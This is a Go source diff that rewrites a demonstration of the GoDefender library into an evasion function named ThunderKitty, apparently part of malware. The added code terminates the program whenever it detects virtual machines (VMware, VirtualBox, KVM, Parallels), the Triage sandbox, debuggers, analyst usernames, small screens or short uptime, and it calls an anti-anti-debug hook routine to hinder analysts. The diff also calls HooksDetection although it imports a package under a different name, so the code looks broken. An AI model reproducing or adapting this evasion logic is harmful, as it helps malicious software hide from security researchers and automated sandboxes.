@@ -1,121 +1,119 @@
-package main
+package AntiDebugVMAnalysis
 
 import (
 	"log"
-
+	"os"
 	// AntiDebug
 	"github.com/EvilBytecode/GoDefender/AntiDebug/CheckBlacklistedWindowsNames"
 	"github.com/EvilBytecode/GoDefender/AntiDebug/InternetCheck"
 	"github.com/EvilBytecode/GoDefender/AntiDebug/IsDebuggerPresent"
 	"github.com/EvilBytecode/GoDefender/AntiDebug/ParentAntiDebug"
-	"github.com/EvilBytecode/GoDefender/AntiDebug/RunningProcesses"
 	"github.com/EvilBytecode/GoDefender/AntiDebug/RemoteDebugger"
+	"github.com/EvilBytecode/GoDefender/AntiDebug/RunningProcesses"
+	"github.com/EvilBytecode/GoDefender/AntiDebug/UserAntiAntiDebug"
 	"github.com/EvilBytecode/GoDefender/AntiDebug/pcuptime"
-
 	// AntiVirtualization
 	"github.com/EvilBytecode/GoDefender/AntiVirtualization/KVMCheck"
 	"github.com/EvilBytecode/GoDefender/AntiVirtualization/MonitorMetrics"
-	"github.com/EvilBytecode/GoDefender/AntiVirtualization/RecentFileActivity"
 	"github.com/EvilBytecode/GoDefender/AntiVirtualization/TriageDetection"
-	"github.com/EvilBytecode/GoDefender/AntiVirtualization/UsernameCheck"
-	"github.com/EvilBytecode/GoDefender/AntiVirtualization/VirtualboxDetection"
-	"github.com/EvilBytecode/GoDefender/AntiVirtualization/VMWareDetection"
 	"github.com/EvilBytecode/GoDefender/AntiVirtualization/USBCheck"
-	
-	// ProcessRelatedTool
-	//"github.com/EvilBytecode/GoDefender/Process/CriticalProcess"
+	"github.com/EvilBytecode/GoDefender/AntiVirtualization/UsernameCheck"
+	"github.com/EvilBytecode/GoDefender/AntiVirtualization/VMWareDetection"
+	"github.com/EvilBytecode/GoDefender/AntiVirtualization/VirtualboxDetection"
+	"github.com/EvilBytecode/GoDefender/AntiVirtualization/VMArtifacts"
+	"github.com/EvilBytecode/GoDefender/AntiVirtualization/RepetitiveProcess"
+	"github.com/EvilBytecode/GoDefender/AntiVirtualization/ParallelsCheck"
 )
 
-func main() {
-	// AntiDebug checks
-	if connected, _ := InternetCheck.CheckConnection(); connected {
-		log.Println("[DEBUG] Internet connection is present")
-	} else {
-		log.Println("[DEBUG] Internet connection isn't present")
-	}
+func ThunderKitty() {
 
-	if parentAntiDebugResult := ParentAntiDebug.ParentAntiDebug(); parentAntiDebugResult {
-		log.Println("[DEBUG] ParentAntiDebug check failed")
+	// lets just catch bunch of vms at beginning lol
+	if usbPluggedIn, err := USBCheck.PluggedIn(); err != nil {
+		os.Exit(-1)
+	} else if usbPluggedIn {
+		log.Println("[DEBUG] USB devices have been plugged in, check passed.")
 	} else {
-		log.Println("[DEBUG] ParentAntiDebug check passed")
+		os.Exit(-1)
 	}
-
-	if runningProcessesCountDetected, _ := RunningProcesses.CheckRunningProcessesCount(50); runningProcessesCountDetected {
-		log.Println("[DEBUG] Running processes count detected")
-	} else {
-		log.Println("[DEBUG] Running processes count passed")
+	if blacklistedUsernameDetected := UsernameCheck.CheckForBlacklistedNames(); blacklistedUsernameDetected {
+		log.Println("[DEBUG] Blacklisted username detected")
+		os.Exit(-1)
 	}
+	// lets make their job harder.
+	HooksDetection.AntiAntiDebug()
 
-	if pcUptimeDetected, _ := pcuptime.CheckUptime(1200); pcUptimeDetected {
-		log.Println("[DEBUG] PC uptime detected")
-	} else {
-		log.Println("[DEBUG] PC uptime passed")
-	}
-
-	CheckBlacklistedWindowsNames.CheckBlacklistedWindows()
-	// Other AntiDebug checks
-	if isDebuggerPresentResult := IsDebuggerPresent.IsDebuggerPresent1(); isDebuggerPresentResult {
-		log.Println("[DEBUG] Debugger presence detected")
-	} else {
-		log.Println("[DEBUG] Debugger presence passed")
-	}
-
-	if remoteDebuggerDetected, _ := RemoteDebugger.RemoteDebugger(); remoteDebuggerDetected {
-		log.Println("[DEBUG] Remote debugger detected")
-	} else {
-		log.Println("[DEBUG] Remote debugger passed")
-	}
-	//////////////////////////////////////////////////////
-
+	//
 	// AntiVirtualization checks
-	if recentFileActivityDetected, _ := RecentFileActivity.RecentFileActivityCheck(); recentFileActivityDetected {
-		log.Println("[DEBUG] Recent file activity detected")
-	} else {
-		log.Println("[DEBUG] Recent file activity passed")
-	}
-
 	if vmwareDetected, _ := VMWareDetection.GraphicsCardCheck(); vmwareDetected {
 		log.Println("[DEBUG] VMWare detected")
-	} else {
-		log.Println("[DEBUG] VMWare passed")
+		os.Exit(-1)
 	}
 
 	if virtualboxDetected, _ := VirtualboxDetection.GraphicsCardCheck(); virtualboxDetected {
 		log.Println("[DEBUG] Virtualbox detected")
-	} else {
-		log.Println("[DEBUG] Virtualbox passed")
+		os.Exit(-1)
 	}
 
 	if kvmDetected, _ := KVMCheck.CheckForKVM(); kvmDetected {
 		log.Println("[DEBUG] KVM detected")
-	} else {
-		log.Println("[DEBUG] KVM passed")
-	}
-
-	if blacklistedUsernameDetected := UsernameCheck.CheckForBlacklistedNames(); blacklistedUsernameDetected {
-		log.Println("[DEBUG] Blacklisted username detected")
-	} else {
-		log.Println("[DEBUG] Blacklisted username passed")
+		os.Exit(-1)
 	}
 
 	if triageDetected, _ := TriageDetection.TriageCheck(); triageDetected {
 		log.Println("[DEBUG] Triage detected")
-	} else {
-		log.Println("[DEBUG] Triage passed")
+		os.Exit(-1)
 	}
+
 	if isScreenSmall, _ := MonitorMetrics.IsScreenSmall(); isScreenSmall {
 		log.Println("[DEBUG] Screen size is small")
-	} else {
-		log.Println("[DEBUG] Screen size is not small")
+		os.Exit(-1)
 	}
-	// USBCheck
-	if usbPluggedIn, err := USBCheck.PluggedIn(); err != nil {
-			log.Println("[DEBUG] Error checking USB devices:", err)
-	} else if usbPluggedIn {
-			log.Println("[DEBUG] USB devices have been plugged in, check passed.")
-	} else {
-			log.Println("[DEBUG] No USB devices detected")
+	if VMArtifacts := VMArtifacts.VMArtifactsDetect(); VMArtifacts {
+		log.Println("[DEBUG] VMArtifacts components detected. Exiting.")
+		os.Exit(-1)
 	}
-	
-   // updating this once v1.0.9 is out!
+
+	if repetitiveproc, _ := RepetitiveProcess.Check(); repetitiveproc {
+		log.Println("[DEBUG] RepetitiveProcess detected. Exiting")
+		os.Exit(-1)
+	}
+
+	if pararelcheck, _ := ParallelsCheck.CheckForParallels(); pararelcheck {
+		log.Println("[DEBUG] Parallels detected. Exiting")
+		os.Exit(-1)
+	}
+
+	CheckBlacklistedWindowsNames.CheckBlacklistedWindows()
+
+	// Other AntiDebug checks
+	if isDebuggerPresentResult := IsDebuggerPresent.IsDebuggerPresent1(); isDebuggerPresentResult {
+		log.Println("[DEBUG] Debugger presence detected")
+		os.Exit(-1)
+	}
+
+	if remoteDebuggerDetected, _ := RemoteDebugger.RemoteDebugger(); remoteDebuggerDetected {
+		log.Println("[DEBUG] Remote debugger detected")
+		os.Exit(-1)
+	}
+
+	if connected, _ := InternetCheck.CheckConnection(); !connected {
+		log.Println("[DEBUG] Internet connection check failed")
+		os.Exit(-1)
+	}
+
+	if parentAntiDebugResult := ParentAntiDebug.ParentAntiDebug(); parentAntiDebugResult {
+		log.Println("[DEBUG] ParentAntiDebug check failed")
+		os.Exit(-1)
+	}
+
+	if runningProcessesCountDetected, _ := RunningProcesses.CheckRunningProcessesCount(50); runningProcessesCountDetected {
+		log.Println("[DEBUG] Running processes count detected")
+		os.Exit(-1)
+	}
+
+	if pcUptimeDetected, _ := pcuptime.CheckUptime(1200); pcUptimeDetected {
+		log.Println("[DEBUG] PC uptime detected")
+		os.Exit(-1)
+	}
+
 }
